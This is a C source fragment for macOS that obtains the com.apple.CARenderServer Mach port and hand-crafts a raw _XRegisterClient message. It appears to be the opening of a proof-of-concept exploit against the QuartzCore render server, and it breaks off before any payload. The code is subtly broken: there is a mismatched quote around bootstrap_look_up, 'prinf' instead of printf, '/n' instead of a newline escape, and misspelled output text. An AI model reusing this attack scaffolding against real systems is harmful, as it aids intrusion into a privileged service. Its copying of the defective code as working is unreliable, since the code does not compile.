#include <stdio.h>
#include <mach/i386/kern_return.h>
#include <mach/mach_traps.h>
#include <servers/bootstrap.h>
#include <dirent.h>
#include <sys/stat.h>
#include <time.h>
#include <dlfcn.h>
#include <unistd.h>

typedef struct quartz_register_client_s quartz_register_client_t;
struct quartz_register_client_s{
   mach_msg_header_t header;
   uint32_t body;
   mach_msg_port_descriptor_t ports[4];
   char padding[12];
};

typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;
struct quartzcore_mach_msg{
   mach_msg_header_t header;
   char msg_body[488];
};

uint64_t get_filesize(const char *fn){
   struct stat st;
   stat(fn, &st);
   uint64_t fsize = st.st_size;
   return fsize;
};

int main(int argc, const char * argv[]){
   mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;
   task_get_bootstrap_port(mach_task_self(), &bs_port);
   const char *render_service_name = "com.apple.CARenderServer";
   kern_return_t(*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT,'bootstrap_look_up");
   kern_return_t kr = bootstrap_look_up(bs_port,render_service_name, &p);
   
   if(kr != KERN_SUCCESS){
      return -1;
   }
   
   prinf("[*] Get service of %s successully!/n",render_service_name);
                                                                                       
   quartz_register_client_t msg_register;
   memset(&msg_register,0,sizeof(msg_register));
   msg_register.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND,MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
   msg_register.header.msgh_remote_port = p;
   msg_register.header.msgh_local_port = mig_get_reply_port();
   msg_register.header.msgh_id = 40202; // _XRegisterClient;
   
   msg_register.body =4;
   msg_register.ports[0].name = mach_task_self();
